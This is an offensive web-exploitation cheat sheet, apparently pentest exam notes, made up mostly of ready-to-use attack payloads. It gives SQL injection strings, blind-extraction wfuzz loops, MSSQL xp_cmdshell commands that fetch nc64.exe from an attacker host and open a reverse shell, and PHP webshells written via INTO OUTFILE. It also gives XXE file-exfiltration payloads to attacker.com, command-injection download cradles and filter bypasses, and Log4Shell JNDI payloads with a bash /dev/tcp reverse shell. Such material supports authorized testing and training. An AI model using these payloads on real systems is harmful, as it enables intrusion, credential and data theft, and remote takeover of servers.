# Error-based payloads
<input>' OR 1=1 -- //
<input>' OR 1=1 in (SELECT @@version) -- //
<input>' OR 1=1 in (SELECT * FROM <table>) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
# UNION — determine column count (increment until error disappears)
<input>' ORDER BY <number> -- -

# Automate column count
wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

# Identify injectable columns
http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -
# Database enumeration
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -
# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -

# Table enumeration
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -
# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -

# Column enumeration
# MySQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -
# MSSQL
http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
# Extract data — MySQL (CONCAT) / MSSQL (+)
http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -
http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM <tablename> -- -

# Meta queries — version, user, datadir
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
http://website.com/index.php?id=-1' UNION SELECT 1, 2, USER(), 4, 5 -- -
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -

# All table/column names
# MySQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -
http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -
# MSSQL
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -

# Dump table to filesystem (MySQL)
http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <table_name> INTO OUTFILE "<file_path>" -- +

# When comments are blocked
http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -

3.5.2.4 Blind Payloads

Blind SQL injection infers state via boolean page differences or deliberate delays; the wfuzz loops below automate char-by-char extraction.

  • Prefer boolean-based over time-based whenever a visible page difference exists — time-based is noisy and prone to false positives from network jitter.
  • Use time-based as a last resort when the page looks identical regardless of condition (fully blind: background UPDATE/INSERT).
  • Binary-search ASCII instead of iterating linearly: ASCII(SUBSTR(...))>64, then >96 etc. — reduces ~95 requests per character to ~7.
-- Probe for vulnerability
http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+

-- Boolean-based: DB name char by char
-- MySQL
http://<host>/index.php?id=1' AND (SUBSTRING(database(), <offset>, 1))='<character>' --+
-- MSSQL
http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, 1))='<character>' --+

-- Boolean-based: retrieve data
-- MySQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --+
-- MSSQL
http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a' --+

-- Time-based: confirm injection
-- MySQL
http://<host>/index.php?id=1' AND SLEEP(10) --+
-- MSSQL
http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+

-- Time-based: conditional delay
-- MySQL
http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+
-- MSSQL
http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+

-- Time-based: DB name extraction char by char
-- MySQL
http://<host>/index.php?id=1' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --+
-- MSSQL
http://<host>/index.php?id=1' AND IIF(SUBSTRING(DB_NAME(),1,1)='a', WAITFOR DELAY '00:00:05', 0) --+
# Automated blind SQLi with wfuzz
# grep "0m9" filters lines where the response was delayed (matched SLEEP(10))

# DB name
for i in $(seq 1 10); do
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+";
done > <filename.txt> && grep "0m9" <filename.txt

# First table name (adjust LIMIT to enumerate further)
for i in $(seq 1 10); do
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+";
done > <filename.txt> && grep "0m9" <filename.txt

# Column name (replace <table_name>)
for i in $(seq 1 10); do
  wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+";
done > <filename.txt> && grep "0m9" <filename.txt

# Extract column content (FUZZ=row offset, FUZ2Z=ASCII value)
for i in $(seq 1 10); do
  wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+";
done > <filename.txt> && grep "0m9" <filename.txt
-- Login bypass payloads
' OR 1=1 --+
' OR 1=1 LIMIT 1 --+
' OR 'a'='a --+

-- MySQL
meh' OR 3=3;#
meh' OR 1=1 --+

-- MSSQL
meh' OR 3=3;--
meh' OR 1=1;--
<?php
// Vulnerable PHP login — unsanitised input concatenated into query
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$execution = mysqli_query($connection, $query) or die(mysqli_error($connection));
$row = mysqli_fetch_array($execution);
if($row) { echo "Login Successful"; } else { echo "Invalid username or password"; }
?>

4.5.3 SQL Truncation

MySQL (non-strict mode) silently truncates VARCHAR data and strips trailing whitespace, so a username padded past the column limit is stored as the target name — potentially colliding with an existing privileged row.

-- Pad username beyond the column limit; trailing chars are trimmed → stored as "admin"
username=admin++++++++&password=testpwn123

4.5.4 Specific Databases

3.5.4.1 MSSQL

MSSQL's xp_cmdshell and EXECUTE AS LOGIN impersonation make it a high-value target once SQL injection is confirmed.

Default system databases: master, msdb, model, resource, tempdb.

-- Recon
SELECT name FROM master.dbo.sysdatabases
SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
union select 1,concat(username,':',password),3,4,5,6 from users--

-- Probe xp_cmdshell and capture hashes
exec xp_dirtree 'c:\'
EXEC xp_cmdshell 'ping [attacker_ip]';

-- Capture Net-NTLMv2 hash via Responder (attacker: sudo responder -A -I tun0)
EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
-- Statement injection — error-based version fingerprint and column enumeration
INSERT INTO dbo.tablename ('1 AND 1=CONVERT(INT,@@version))-- ', '<user_input>');

-- Enumerate columns via CONVERT error
', CONVERT(INT, (CHAR(58)+(SELECT DISTINCT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<table_name>' ORDER BY column_name ASC)+CHAR(58))))--

-- Enumerate data via CONVERT error
', CONVERT(INT, (CHAR(58)+CHAR(58)+(SELECT TOP 1 <column> FROM <table_name> ORDER BY <column> ASC)+CHAR(58)+CHAR(58))))--
-- RCE via stacked query injection
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
';EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe";--
';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--
-- RCE via input-field injection
<username>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
<username>'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
<username>'; EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<attacker_ip>:<port>/shell.exe C:\\Windows\\temp\\shell.exe'; --
<username>'; EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe'; --
-- Impersonation
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

-- Check linked databases
SELECT srvname, isremote FROM sysservers;

-- Enable xp_cmdshell after impersonation
EXEC master.dbo.sp_configure 'show advanced options', 1;
RECONFIGURE;

Extra references: From MSSQL Injection to RCE | PayloadsAllTheThings MSSQL Injection | MSSQL Practical Injection Cheat Sheet

3.5.4.2 MySQL

MySQL RCE relies on writing a PHP webshell via INTO OUTFILE when the DB user has FILE privilege and the web root is writable; check SELECT @@secure_file_priv first.

Default system databases: mysql, information_schema, performance_schema, sys.

mysql -u <username> -p'<password>' -h <host> -P <port>
-- Recon
SHOW DATABASES;
USE <database_name>;
SHOW TABLES;
DESCRIBE <table_name>;
SELECT version();
SELECT system_user();
SELECT user FROM mysql.user;

-- Privilege escalation (if you have GRANT capability)
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Test injection
';#---

-- RCE — write PHP webshell via INTO OUTFILE
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php";
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

-- Via UNION injection
' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -

-- Windows
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php"

Extra references: PayloadsAllTheThings MySQL Injection

3.5.4.3 MariaDB

MariaDB shares MySQL's SQL dialect and information_schema structure; all MySQL UNION, error-based, and blind payloads apply without modification.

-- Authentication bypass
admin ' OR 1=1 --
1' OR 1 = 1 #

-- UNION enumeration
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'--
' UNION SELECT <column1>, <column2> FROM <table_name>--

Extra references: MariaDB SQL Injection Example

3.5.4.4 Oracle

Oracle requires FROM dual in UNION SELECT statements and uses all_users, all_tables, and all_tab_columns in place of information_schema; use -- for comments, not #.

XSS Type Trigger Persistence Impact Detection Signal
Reflected Malicious payload in URL parameter echoed immediately in the response None — victim must click crafted link Session hijack (steal cookie), credential phishing via injected form, forced redirect Input echoed unsanitised in response body; alert/confirm fires on page load
Stored (Persistent) Payload saved to database/file; executes whenever the stored content is rendered Permanent until removed from storage Mass session hijack of all users viewing the page, defacement, keylogging, internal SSRF via fetch() Payload visible in DB/response on subsequent page loads; fires for every viewer without a crafted link
DOM-based Client-side JavaScript reads attacker-controlled source (e.g., location.hash) and writes to a sink (innerHTML, eval()) None — payload in URL fragment or client-side storage Same as reflected; harder to detect server-side because payload never reaches the server No server-side echo; payload only visible in browser DOM; requires JS source review for dangerous sinks
Blind Stored payload executes in a context the attacker cannot directly observe (admin panel, email client, log viewer) Persists until admin views the affected page Admin session hijack, internal network reconnaissance via out-of-band callbacks, credential theft from privileged context Out-of-band callback to Burp Collaborator / XSS Hunter; no visible response at injection time
Self-XSS Payload only executes in the attacker's own browser context None — affects only injector Low standalone impact; can be chained with CSRF to force victim to inject into their own context Injection point lacks storage or reflection to other users; verify by logging in as a second user 
-- Oracle UNION-based injection
' UNION SELECT 1,2,3,4,5 FROM dual--
' UNION SELECT 1,2,3 FROM dual--

-- User, table, and column info from data dictionary
' UNION SELECT username, NULL, NULL FROM all_users--
' UNION SELECT table_name, NULL, NULL FROM all_tables--
' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'--
' UNION SELECT <column_name>, NULL FROM <table_name>--

-- Login bypass
admin ' OR 1=1 --

Extra references: SecurityIdiots Oracle Union-Based Injection

4.6 XXE (XML External Entity) Injection

XXE vulnerabilities arise when an XML parser resolves external entities from untrusted input, letting an attacker read local files or exfiltrate data out-of-band.

  • If the target file contains XML special characters the entity breaks; base64-encode via a PHP filter wrapper or use a CDATA wrapper. Blind XXE requires an out-of-band channel (DNS/HTTP).
  • SVG upload features and Office document importers (DOCX/XLSX) are common XXE entry points — embed the entity declaration directly inside the file's XML structure.
  • If the parser does not support SYSTEM entities, test XInclude (<xi:include href="file:///etc/passwd"/>) when you control only a document fragment.
  • For RCE, replace spaces with $IFS to avoid breaking XML syntax.
Key Definition Example
Tag The keys of an XML document, usually wrapped with (</>) characters. <date>
Entity XML variables, usually wrapped with (&/;) characters. &lt;
Element The root element or any of its child elements; its value is stored between a start-tag and an end-tag. <date>01-01-2022</date>
Attribute Optional specifications for any element stored in the tags, which may be used by the XML parser. version="1.0"/encoding="UTF-8"
Declaration Usually the first line of an XML document; defines the XML version and encoding to use when parsing it. <?xml version="1.0" encoding="UTF-8"?>

PHP stream wrappers are frequently used inside XXE payloads (and LFI exploits) to transform file content before it reaches the response.

Wrapper Syntax Example Primary Use Notes / When to Choose
php://filter/convert.base64-encode php://filter/convert.base64-encode/resource=index.php Exfiltrate PHP source code without execution Essential when the file contains XML special chars or PHP tags that would break entity resolution or trigger execution; decode the base64 response client-side.
php://filter/read=string.rot13 php://filter/read=string.rot13/resource=config.php Obfuscate content to bypass WAF keyword filters Useful when WAF blocks requests containing keywords like passwd in the response; ROT13 the returned data then decode locally.
php://filter/zlib.deflate+base64 php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd Compress then encode large files for exfiltration Chained filters are applied left-to-right; combine compression with base64 to safely transmit binary or large text files through XML.
php://input php://input (POST body as stream) Write arbitrary content / RCE via LFI + POST Only works when allow_url_include is on; send PHP code in the POST body and reference php://input via an LFI parameter to achieve RCE.
data:// data://text/plain;base64,<b64_payload> Inline code execution via LFI Requires allow_url_include; embed a base64-encoded PHP stub directly in the URL — no remote host needed, making it stealthier than http:// wrappers.
expect:// expect://id Direct OS command execution Requires the rarely-enabled expect PHP extension; when present, the wrapper passes the argument straight to popen() — immediate RCE with no shell escaping needed.
zip:// zip:///tmp/upload.zip#shell.php Execute PHP inside an uploaded ZIP Upload a ZIP containing a PHP web shell; reference the inner file with # notation via an LFI to execute it. Works when the upload directory is web-accessible.
phar:// phar:///var/www/html/uploads/file.phar/shell.php Execute PHP inside a PHAR archive; trigger phar deserialization Even if file extension is changed (e.g., renamed to .jpg), PHP still processes the PHAR magic bytes; also used for object-injection attacks via phar:// on file-operation functions.
file:// file:///etc/passwd Read local filesystem files The baseline wrapper used in XXE payloads; returns raw file content without transformation. Not usable for PHP execution, only disclosure.
http:// / ftp:// http://attacker.com/shell.php Remote file inclusion (RFI) Requires allow_url_fopen (and allow_url_include for inclusion); blocked in hardened configs. Generates outbound network traffic — noisy. 
# Read /etc/passwd - basic local file disclosure
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
# Read /etc/hosts
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
<data>&localHosts;</data>
# Blind XXE - load remote DTD then exfiltrate via out-of-band
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE request [
   <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
   <!ENTITY % all "<!ENTITY send SYSTEM 'file:///etc/passwd'>">
   %remote;
   %all;
]>
<request>&send;</request>
# Read source code - base64-encode to bypass XML special-char breakage
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
# Remote code execution - use $IFS in place of spaces to avoid XML breakage
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

4.7 IDOR (Insecure Direct Object References)

IDOR occurs when an application uses a client-supplied identifier to fetch a back-end object without verifying the authenticated session owns that object.

  • Hashed or encoded references are not the same as authorisation; always decode and test. Test all HTTP methods — some apps enforce access on GET but not POST.
  • Horizontal IDOR accesses a peer's resource at the same privilege level; vertical IDOR escalates privilege to an admin endpoint.
  • UUIDs appear non-guessable but may be predictable if the application uses UUID v1 (timestamp-based) or if UUIDs leak via shared endpoints or API responses.
# GET-based enumeration - UID in query string, grab PDFs
url="http://[ip]:[port]"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
# POST-based enumeration - any file extension
for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\.\w+"); do
        curl -O $url/$link
    done
done

JavaScript AJAX calls sometimes expose admin-only API endpoints in the front-end code even when the UI hides them. Locate the function and call it directly to test whether backend access control is enforced:

// Admin function exposed in client-side JS - test directly
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){}
    });
}

// Hashed object reference - MD5 of filename used as the parameter
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){}
});

References may be encoded or hashed: download.php?filename=ZmlsZV8xMjMucGRm (base64) or download.php?filename=c81e728d9d4c2f636f067f89cc14862c (MD5). Decode to discover the pattern, then forge your own.

Register two accounts and compare HTTP requests. When an API exposes a uid, uuid, or role field, modify both the UID and URL simultaneously:

{
  "attributes" :
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}
{
    "uid": 1,
    "uuid": "40f5888b67c246df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "emma LastName",
    "email": "emma@employees.com",
    "about": "A pentester and red teamer."
}
Pattern Where the ID Appears Test Method Confirms Vulnerability
Sequential integer URL param: ?id=42 Increment/decrement by 1; use Burp Intruder for range Another user's data returned with HTTP 200
Base64-encoded value URL param or POST body: ?file=ZmlsZV8x Decode, alter pattern, re-encode and resend Different record or file returned without error
MD5 / hashed filename POST body: filename: md5(file_1.pdf) Compute md5("file_2.pdf") and substitute Unauthorised file download succeeds
UUID / GUID API path: /api/users/<uuid> Harvest UUIDs from other API responses; substitute in privileged endpoints Full user object including sensitive fields returned
HTTP method bypass Any endpoint Repeat same request changing GET→POST or DELETE→GET Access control enforced on one method but not another
Mass-assignment / role field JSON body: "role":"admin" Add or change role, is_admin, group_id in PUT/PATCH body Privilege escalation reflected in subsequent responses

4.8 Command Injections

Command injection occurs when user-supplied input is passed unsanitised to a shell function; append a second command using an injection operator to execute attacker-controlled code.

  • Confirm with a time-delay payload (; sleep 5) when output is not reflected.
  • WAFs often block ;, |, & — fall back to newline (%0a) or sub-shell ($()) variants.
  • Blind exfiltration via DNS: nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
  • PowerShell and CMD handle operators differently; ; works in PowerShell but not CMD; backtick sub-shells (`cmd`) are PowerShell-only.
# Detect execution context - reveals CMD vs PowerShell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
# Vulnerable PHP / Node patterns - unsanitised input passed to system()
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>

app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
# Execute a command injection via curl - URL-encoded payload
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F[attacker_ip]%2Fpowercat.ps1%22)%3Bpowercat%20-c%20[attacker_ip]%20-p%20[port]%20-e%20powershell' http://[target]:[port]/archive

The semicolon does not work in CMD but works in PowerShell; the others work on both platforms unless noted.

Injection Operator Injection Character URL-Encoded Character Executed Command
Semicolon ; %3b Both
New Line %0a Both
Background & %26 Both (second output generally shown first)
Pipe | %7c Both (only second output is shown)
AND && %26%26 Both (only if first succeeds)
OR | %7c%7c Second (only if first fails)
Sub-Shell `` %60%60 Both (Linux-only)
Sub-Shell $() %24%28%29 Both (Linux-only)
Operator Effect Context / When to Choose Filter-Evasion Notes
; Runs both commands sequentially; second always runs regardless of first's exit code Linux / PowerShell; first choice when you want both commands to execute and don't need the first to succeed Commonly blocked by WAFs; substitute with %0a (newline) if %3b is filtered
\n (newline, %0a) Shell treats it as a command separator identical to ; Both Linux and Windows; excellent WAF bypass because many filters key on ; and & but miss raw newlines URL-encode as %0a; double-encode as %250a if the app URL-decodes once before parsing
& Runs first command in the background, immediately runs second; both outputs may appear interleaved Both platforms; useful when the first command is slow (e.g., a ping) and you want the injected command to run immediately without waiting Single & looks like a query-string parameter separator — some WAFs allow it; still URL-encode as %26 in request bodies
| Pipes stdout of first command into stdin of second; only second command's output is visible Both platforms; ideal when you want to suppress the original command's output and show only the injected command's result Blocked by many filters as a single char; try %7c or insert a shell-ignored char: |'|'whoami
&& Short-circuit AND: second command runs only if first exits with code 0 Both platforms; use when you need the original command to succeed before injecting Requires the first command to succeed; if the application intentionally makes the first command fail, use || instead
|| Short-circuit OR: second command runs only if first fails (non-zero exit) Both platforms; useful when the intended command always fails — guarantees the injected command runs WAFs sometimes confuse single | with double || — URL-encode as %7c%7c to be explicit
$( ) (command substitution) Executes inner command and substitutes its output inline; can be nested Linux / bash only; use when the injection point is inside a string where operators like ; are not syntactically valid URL-encode as %24%28%29; nesting ($($(cmd))) can defeat simple pattern-match filters
Backtick ` ` Older form of command substitution; equivalent to $( ) Linux / bash; use as an alternative when $() is filtered; not available in CMD URL-encode as %60%60; backtick pairs are easy to miss in WAF rules that look for balanced parentheses 
# Space blacklisted - use tab (%09), $IFS, or brace expansion
%09
$IFS
{ls,-la}

# / or \ blacklisted (Linux) - derive / from $PATH
echo ${PATH:0:1}

# Commands blacklisted (general) - insert shell-ignored characters
w'h'o'am'i
w"h"o"am"i

# Commands blacklisted (Linux only) - \ or $@
who$@ami
w\ho\am\i

# Commands blacklisted (Windows CMD only) - ^
who^ami

# Reverse commands (Linux)
$(rev<<<'imaohw')

# Encoded commands (Linux)
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# / or \ blacklisted (Windows) - derive \ from $env:HOMEPATH
$env:HOMEPATH[0]

# Reverse commands (Windows)
iex "$('imaohw'[-1..-20] -join '')"

# Encoded commands (Windows)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
# Bashfuscator - automated Linux obfuscation
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user
./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# DOSfuscation - automated Windows obfuscation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
# Inside the tool:
# SET COMMAND type C:\Users\[user]\Desktop\flag.txt
# encoding → 1

4.9 Log4Shell

Log4Shell (CVE-2021-44228) abuses Log4j's JNDI lookup feature: injecting a ${jndi:...} string into any logged field causes the server to reach out to an attacker-controlled LDAP/RMI server, which can then serve a malicious class for remote code execution.

  • Target must be running Log4j 2.0-beta9 through 2.14.1; any logged field is an injection point: User-Agent, X-Forwarded-For, login usernames, search queries.
  • Newer JVMs (8u191+, 11.0.1+) disable remote class loading via com.sun.jndi.ldap.object.trustURLCodebase=false; bypass using a deserialization gadget chain (e.g., ysoserial).
  • WAFs blocking ${jndi: can be bypassed with expression nesting: ${${lower:j}ndi:...}, ${${::-j}${::-n}${::-d}${::-i}:...}, or ${${upper:j}ndi:...}.
  • Log4j 2.15.0's patch was incomplete (CVE-2021-45046); 2.16.0 disabled JNDI lookups entirely; 2.17.0 fixed a DoS (CVE-2021-45105). Always confirm the exact version.
# Inject via query string
curl -X GET 'http://[target]:8080/?search=${jndi:ldap://[attacker]:1389/a}'
# Inject via User-Agent header
curl -X GET http://[target] -H "User-Agent: \${jndi:ldap://[attacker]:1389/a}"
# Inject via POST body
curl -X POST http://[target]/login -d "username=\${jndi:ldap://[attacker]:1389/a}&password=test"
# Catch the callback
nc -lvnp [port]

# Bash reverse shell payload (served by the attacker LDAP/RMI server)
bash -i >& /dev/tcp/[attacker]/[port] 0>&1

# Trigger payload referencing the hosted reverse shell
${jndi:ldap://[attacker]:1389/bash-reverse-shell}
Payload Variant Bypass Technique Protocol When to Use
${jndi:ldap://...} None — baseline payload LDAP (port 389) First attempt on unpatched, WAF-free targets; delivers Java class for RCE
${jndi:dns://...} None DNS Blind callback confirmation only; no class loading, minimal IDS signature; use before LDAP to confirm reachability
${${lower:j}ndi:ldap://...} Log4j ${lower:} expression nesting LDAP Bypass WAF rules matching the literal string ${jndi:
${${::-j}${::-n}${::-d}${::-i}:ldap://...} Empty-prefix expression concatenation LDAP Aggressive WAF bypass; each character is constructed individually, defeating substring-match rules
${jndi:rmi://...} Protocol switch RMI (port 1099) Use when outbound LDAP (389) is blocked by egress firewall but RMI is not
JNDI + ysoserial gadget chain Deserialization gadget instead of remote class URL LDAP / RMI JVM 8u191+ with trustURLCodebase=false; gadget chains work without remote class loading, exploiting vulnerable libraries on the classpath (e.g., Commons Collections)

4.10 Exploiting CVEs

Pre-built public exploits on Exploit-DB cover a wide range of web vulnerabilities; always match the exact version before running.

  • Fingerprint the exact software name and version via headers, error pages, /readme.txt, or admin panels before firing any CVE exploit.
  • Public exploits are often written for a narrow version range; read the source, adjust hardcoded offsets or paths, and check for backdoors.
  • Python 2 PoCs are common on Exploit-DB; run 2to3 exploit.py -w to auto-convert when only Python 3 is available.
# Query offline Exploit-DB mirror
searchsploit <product> <version>

# Copy exploit for local editing
searchsploit -m <EDB-ID>
# Search in msfconsole by product
search type:exploit name:<product>
# CVE-2014-6287 - HFS (HTTP File Server) 2.3.x Remote Command Execution
https://www.exploit-db.com/exploits/49584

# CVE-2015-6518 - phpliteadmin <= 1.9.3 Remote PHP Code Injection
https://www.exploit-db.com/exploits/24044

# CVE-XXXX-XXXX - Cuppa CMS /alertConfigField.php Local/Remote File Inclusion
https://www.exploit-db.com/exploits/25971

# CVE-2009-4623 - Advanced Comment System 1.0 Remote File Inclusion
https://www.exploit-db.com/exploits/9623
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py

# CVE-2018-18619 - Advanced Comment System 1.0 SQL Injection
https://www.exploit-db.com/exploits/45853
Step Action Command / Tool Goal
1 — Fingerprint Identify software name and exact version curl -I http://[target]/, check Server: / X-Powered-By: headers, /readme.txt, login page footer Narrow CVE search to a specific version range
2 — Search (local) Query offline Exploit-DB mirror searchsploit <product> <version> Find EDB-ID without internet; works in air-gapped exam environments
3 — Search (online) Cross-reference NVD for CVSS and version range Browse nvd.nist.gov or exploit-db.com Confirm attack vector, auth requirement, affected versions
4 — Copy exploit Get editable local copy searchsploit -m <EDB-ID> Edit LHOST/LPORT, paths, Python version without modifying the Exploit-DB mirror
5 — Read source Understand and sanitise the exploit cat exploit.py / text editor Check for hard-coded backdoors, verify expected behaviour, adjust version-specific offsets
6 — Run Execute against target python3 exploit.py [target] [port] or Metasploit run Obtain shell, read flag, escalate as appropriate

4.11 Fixing & Modifying Public Exploits

Public exploits rarely run as-is. The skill that matters here is adapting an existing exploit to your target rather than writing one from scratch. There are two classes: memory-corruption exploits (buffer overflows) and web exploits. Always read the entire exploit before running it — public PoCs sometimes contain obfuscated backdoors that attack you.

4.11.1 Fixing Memory Corruption Exploits

Buffer overflow in a nutshell: user input overflows a stack buffer and overwrites the saved return address. When the function returns, that address is loaded into EIP/RIP (the instruction pointer). Overwrite it with the address of a JMP ESP instruction so execution jumps into your shellcode, which sits right after the return address (often behind a NOP sled).

What to fix Why / How
Socket info (IP & port) Update the target/connect-back IP and port hard-coded in the exploit to match your machine and the target.
